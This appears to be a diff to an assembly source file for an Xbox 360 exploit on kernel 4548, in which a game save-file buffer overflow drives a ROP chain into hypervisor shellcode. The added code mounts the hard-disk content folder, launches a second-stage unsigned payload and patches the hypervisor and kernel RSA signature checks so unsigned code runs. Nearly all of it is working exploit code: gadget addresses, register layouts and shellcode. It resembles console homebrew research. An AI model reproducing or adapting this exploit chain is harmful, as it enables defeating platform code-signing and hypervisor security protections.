@@ -5,24 +5,27 @@
 # Save file constants
 .set    GapDataStartFileOffset,         0xDF4       # Offset of the gap data in the save file
 .set    GapDataStartHeapAddress,        0xB43B682E  # Address of the gap data on the heap
+.set	OriginalStackPointer,			0x7004F2F0	# Stack pointer value upon exiting the load park function
 
 ###########################################################
 # Kernel constants for 4548
 .set    MmAllocatePhysicalMemoryEx,     0x8007CC18
 .set    MmGetPhysicalAddress,           0x8007C9F8
+.set	ObCreateSymbolicLink,			0x80088A08
 .set    KernelSyscall,                  0x800747CC
 
-.set    KernelAccessMaskAddress,        0x80176000  # Address of the memory access mask in the kernel
+.set    KernelAccessMaskAddress,        0x80176000  # Address of MmPhysical64KBMappingTable in the kernel
 .set    HvSyscallTableAddress,          0xA0002100  # Address into the hv syscall table where we will write the jump address
 .set    HvTargetJumpAddress,            0x00000350  # Address in the hv we will jump to
 .set    HvSyscallNumber,                0x0000003F  # Syscall number we will call to execute the hack
 
 ###########################################################
 # Tony Hawk gadget address.
-.set    __restgprlr_27, 0x82088D4C  # addi  r1, r1, 0x80, b __restgprlr_27
-.set    __restgprlr_28, 0x8208003C  # addi  r1, r1, 0x80, b __restgprlr_28
-.set    __restgprlr_29, 0x820807D0  # addi  r1, r1, 0x70, b __restgprlr_29
-.set    stw_r28,        0x82447828  # stw   r28, 0x14(r31), mtctr   r29, bctrl
+.set    __restgprlr_27, 				0x82088D4C  # addi  r1, r1, 0x80, b __restgprlr_27
+.set    __restgprlr_28, 				0x8208003C  # addi  r1, r1, 0x80, b __restgprlr_28
+.set    __restgprlr_29, 				0x820807D0  # addi  r1, r1, 0x70, b __restgprlr_29
+.set    stw_r28,        				0x82447828  # stw   r28, 0x14(r31), mtctr   r29, bctrl
+.set	XamLoaderLaunchTitle,			0x824F6CA4	#
 
 ###########################################################
 # ROP gadget addresses
@@ -45,6 +48,17 @@
 .set    ROPGadget16,    0x824D8A60
 .set    ROPGadget17,    0x82446840
 .set    ROPGadget18,    KernelSyscall
+.set	ROPGadget19,	0x824DB99C
+.set	ROPGadget20,	stw_r28
+.set	ROPGadget21,	__restgprlr_28
+.set	ROPGadget22,	0x82159884
+.set	ROPGadget23,	0x822DC124
+.set	ROPGadget24,	0x824DB99C
+
+.set PTE_VALID,				8
+.set PTE_NO_EXECUTE,		4
+.set PTE_DATA,				2
+.set PTE_READ_ONLY,			1
 
 #-------------------------------------------------------------------------------------------------------------------
 #                                           Explanation of the hack
@@ -723,7 +737,24 @@ _7:     .long   ROPGadget18
         # lwz       r11, 8(r28)         # load address of next gadget
         # mtctr     r11
         # bctrl                         # jump to next gadget
+		# 
+		# mr.		r26, r3
+		# beq		...
+		# ...
+		# mr        r3, r26
+		# addi      r1, r1, 0x90		# prolog: prepare for next gadget
+		# b         __restgprlr_25
         ###########################################################
+		.fill   0x50, 1, 0x00
+		.long	0x25252525, 0x25252525	# r25
+		.long	0x26262626, 0x26262626	# r26
+		.long	0x27272727, 0x27272727	# r27
+		.long	0x28282828, 0x28282828	# r28
+		.long	0x00000000, GapDataStartHeapAddress + (hdd_symlink_path - _gap_data_start)	# r29 - address of the file path to link
+		.long	0x00000000, GapDataStartHeapAddress + (hdd_symlink_mount - _gap_data_start)	# r30 - address of the mount path to link to
+		.long	0x00000000, ObCreateSymbolicLink	# r31 - function to call = ObCreateSymbolicLink
+		.long	ROPGadget19				# lr - next gadget address
+		.long   0x00000000              #
         
         ###########################################################
         # Gadget 18: syscall
@@ -731,6 +762,99 @@ _7:     .long   ROPGadget18
         # sc        # execute syscall which will cause the hypervisor to jump to our shellcode
         # blr
         ###########################################################
+		
+		###########################################################
+        # Gadget 19: create a symbolic link for the hdd content folder
+        #
+        # mr        r6, r27             # 
+        # mr        r5, r28             # 
+        # mr        r4, r29             # hdd_symlink_path_str
+        # mr        r3, r30             # hdd_symlink_mount_str
+        # mtctr     r31
+        # bctrl                         # call ObCreateSymbolicLink and mount the hdd content folder
+        # b         ...
+        # ...
+        # addi      r1, r1, 0x90        # prolog: prepare for next gadget
+        # b         __restgprlr_26
+        ###########################################################
+		.fill   0x58, 1, 0x00
+		.long	0x26262626, 0x26262626	# r26
+		.long	0x27272727, 0x27272727	# r27
+		.long   0x00000000, 0x00000000  # r28 - value to store (new memory access mask)
+        .long   0x00000000, ROPGadget21 # r29 - next next gadget address
+        .long   0x30303030, 0x30303030  # r30
+        .long   0x00000000, KernelAccessMaskAddress - 0x14  # r31 - address to store value at
+        .long   ROPGadget20             # lr - next gadget address
+        .long   0x00000000              #
+		
+		###########################################################
+        # Gadget 20: restore kernel memory access mask
+        #
+        # stw       r28, 0x14(r31)
+        # mtctr     r29
+        # bctrl
+        ###########################################################
+		
+		###########################################################
+        # Gadget 21: setup registers for next gadget
+        #
+        # addi      r1, r1, 0x80
+        # b         __restgprlr_28
+        ###########################################################
+        .fill   0x58, 1, 0x00
+        .long   0x00000000, OriginalStackPointer  # r28 - dst = original stack pointer
+        .long   0x00000000, (_buffer_overflow_end - _stack_data_part_2) / 2	# r29 - size of data to copy
+        .long   0x30303030, 0x30303030  # r30
+        .long   0x00000000, GapDataStartHeapAddress + (_8 - _gap_data_start) - 0x10  # r31 - pointer to memcpy src address
+        .long   ROPGadget22             # lr - next gadget address
+_8:     .long   GapDataStartHeapAddress + (_stack_data_part_2 - _gap_data_start)     # pointer to stack data to copy
+		
+		###########################################################
+        # Gadget 22: memcpy - copy stack data to the real stack
+        #
+        # slwi      r5, r29, 2          # Size of the copy (PAGE_SIZE)
+        # lwz       r4, 0x10(r31)       # Address of our shell code below
+        # mr        r3, r28
+        # bl        memcpy
+        # addi      r1, r1, 0x80
+        # b         __restgprlr_28
+        ###########################################################
+        .fill   0x58, 1, 0x00
+        .long   0x28282828, 0x28282828  # r28
+        .long   0x00000000, 0x00000000	# r29 - flags for XLaunchNewImage
+        .long   0x00000000, GapDataStartHeapAddress + (payload_file_path - _gap_data_start)	# r30 - file path to the second stage payload xex
+        .long   0x00000000, XamLoaderLaunchTitle  # r31 - call address for gadget 24
+        .long   ROPGadget23             # lr - next gadget address
+		.long   0x00000000              # 
+		
+		###########################################################
+        # Gadget 23: stack pivot
+        #
+        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
+        # lwz       r12, -8(r1)         # Load next gadget address
+        # mtlr      r12
+        # blr
+        ###########################################################
+		.long	OriginalStackPointer + 8	# Stack pointer to pivot to
+		
+_stack_data_part_2:
+
+		.long	ROPGadget24				# lr - next gadget address
+		.long	0x00000000
+
+		###########################################################
+        # Gadget 24: launch the second stage payload xex
+        #
+        # mr        r6, r27             # 
+        # mr        r5, r28             # 
+        # mr        r4, r29             # flags = 0
+        # mr        r3, r30             # payload_file_path
+        # mtctr     r31
+        # bctrl                         # call XamLoaderLaunchTitle and launch the second stage xex
+        ###########################################################
+
+		# Pad the data to the next 4 byte boundary.
+		.long	0x00000000
 
 _buffer_overflow_end:
 
@@ -773,50 +897,53 @@ _shell_code_start:
         addi    %r11, %r11, (HvxSendSMCMessage - _shell_code_start)
         mtctr   %r11
         bctrl
+		
+		# Disable RMCI.
+		li		%r3, 0
+		li		%r11, 0xB64
+		mtctr	%r11
+		bctrl
+		
+		# Fix the hv data we trashed with the exploit.
+		li		%r5, 1
+		ld		%r29, (hv_restore_data_address - _shell_code_start)(%r31)
+		mr		%r4, %r29													# dst = start of cache line we overwrote
+		addi	%r3, %r31, (hv_restore_data - _shell_code_start)			# src = restore data address
+		li		%r11, 0x14B8
+		mtctr	%r11
+		bctrl
+		icbi	0, %r29
+		
+		# Apply patches to the hypervisor so we can run unsigned code.
+		lis		%r4, 0x3860
+		ori		%r4, %r4, 1		# opcode for 'li r3, 1'
+		ld		%r3, (hv_rsa_patch_address - _shell_code_start)(%r31)
+		stw		%r4, 0(%r3)
+		
+		li		%r5, 0x7F
+		andc	%r3, %r3, %r5
+		icbi	0, %r3
+		
+		# Apply patches to the kernel so we can run unsigned code.
+		ld		%r3, (kernel_rsa_patch_address - _shell_code_start)(%r31)
+		stw		%r4, 0(%r3)
+		
+		andc	%r3, %r3, %r5
+		icbi	0, %r3
+		
+		# Enable RMCI.
+		li		%r3, 1
+		li		%r11, 0xB64
+		mtctr	%r11
+		bctrl
         
-        # HACK HACK HACK
-        li      %r3, 0x6969
+        # We must return 0 for the calling gadget to finish successfully.
+        li      %r3, 0
         
         # Destroy the stack frame.
         addi    %r1, %r1, 0x40
         ld      %r31, -0x10(%r1)
         ld      %r12, -0x8(%r1)
-        mtlr    %r12
-        blr
-
-        ###########################################################
-        # DbgPrint(%r3 psMessage)
-DbgPrint:
-        # Save the return address.
-        mflr    %r12
-        
-        # Setup the rs232 physical address.
-        lis     %r4, 0x8000
-        ori     %r4, %r4, 0x200
-        rldicr  %r4, %r4, 32,31
-        oris    %r4, %r4, 0xea00    # 0x80000200.EA000000
-            
-putc:
-        # Load next byte of the message.
-        lbz     %r5, 0(%r3)         # load char
-        cmpwi   %r5, 0              # exit if NULL
-        beq     done
-        
-        # Byte swap it.
-        slwi    %r5, %r5, 24
-        stw     %r5, 0x1014(%r4)    # output to tx
-        
-        # Wait until it's ready to send the next byte.
-1:
-        lwz     %r5, 0x1018(%r4)
-        rlwinm. %r5, %r5, 0, 6, 6
-        beq     1b                  # wait until ready
-        
-        # Next iteration.
-        addi    %r3, %r3, 1
-        b       putc
-        
-done:
         mtlr    %r12
         blr
         
@@ -871,13 +998,56 @@ smc_write:
         ld      %r12, -0x8(%r1)
         mtlr    %r12
         blr
+		
         
         ###########################################################
         # Data
-hello_str:
-        .ascii  "Hello from hypervisor land!\r\n"
-        .byte   0x00
-        .align  4
+		
+hdd_symlink_mount_str:
+		.ascii	"\\??\\PAYLOAD:"
+		hdd_symlink_mount_str_length =			. - hdd_symlink_mount_str
+		.byte	0x00
+		.align	4
+		
+hdd_symlink_path_str:
+		.ascii "\\Device\\Harddisk0\\Partition1\\Content"
+		hdd_symlink_path_str_length =			. - hdd_symlink_path_str
+		.byte	0x00
+		.align	4
+		
+hdd_symlink_mount:
+		.word	hdd_symlink_mount_str_length
+		.word	hdd_symlink_mount_str_length + 1
+		.long	GapDataStartHeapAddress + (hdd_symlink_mount_str - _gap_data_start)
+		
+hdd_symlink_path:
+		.word	hdd_symlink_path_str_length
+		.word	hdd_symlink_path_str_length + 1
+		.long	GapDataStartHeapAddress + (hdd_symlink_path_str - _gap_data_start)
+		
+payload_file_path:
+		.ascii	"PAYLOAD:\\boot.xex"
+		.byte	0x00
+		.align	4
+		
+hv_restore_data:
+		.byte 0x00, 0x00, 0xC3, 0x70, 0x00, 0x00, 0x8C, 0x38, 0x00, 0x00, 0xA6, 0xE0, 0x00, 0x00, 0x68, 0x00
+		.byte 0x00, 0x00, 0xB9, 0x28, 0x00, 0x00, 0xB9, 0x40, 0x00, 0x00, 0xB9, 0x48, 0x00, 0x00, 0xB9, 0xF0
+		.byte 0x00, 0x00, 0x5C, 0xC8, 0x00, 0x00, 0x5E, 0x58, 0x00, 0x00, 0x5F, 0x58, 0x00, 0x00, 0x60, 0x68
+		.byte 0x00, 0x00, 0x8F, 0x78, 0x00, 0x00, 0x90, 0x18, 0x00, 0x00, 0x91, 0x30, 0x00, 0x00, 0x92, 0x08
+		.byte 0x00, 0x00, 0x93, 0x28, 0x00, 0x00, 0x94, 0x60, 0x00, 0x00, 0xC3, 0x78, 0x00, 0x00, 0xC3, 0x80
+		.byte 0x00, 0x00, 0xC3, 0x88, 0x00, 0x00, 0x94, 0x70, 0x00, 0x00, 0x94, 0xE8, 0x00, 0x00, 0x95, 0x30
+		.byte 0x00, 0x00, 0x95, 0x80, 0x00, 0x00, 0x95, 0xC8, 0x00, 0x00, 0x95, 0xD8, 0x00, 0x00, 0xC3, 0x90
+		.byte 0x00, 0x00, 0xC3, 0x98, 0x00, 0x00, 0xC3, 0xA0, 0x00, 0x00, 0xC3, 0xA8, 0x00, 0x00, 0xC3, 0xB0
+		
+hv_restore_data_address:
+		.long 0x00000000, 0x00002100				# Physical address of HvSyscallTableAddress aligned to the start of the cache line
+		
+hv_rsa_patch_address:
+		.long 0x00000000, 0x000044C8				# Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in HvxCreateImageMapping
+		
+kernel_rsa_patch_address:
+		.long 0x80000300, 0x00078080				# Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in XexpVerifyXexHeaders
             
 _shell_code_end:
 _gap_data_end:
@@ -886,4 +1056,3 @@ _gap_data_end:
 # End of file
 #---------------------------------------------------------
 .long 0xffffffff
-.end
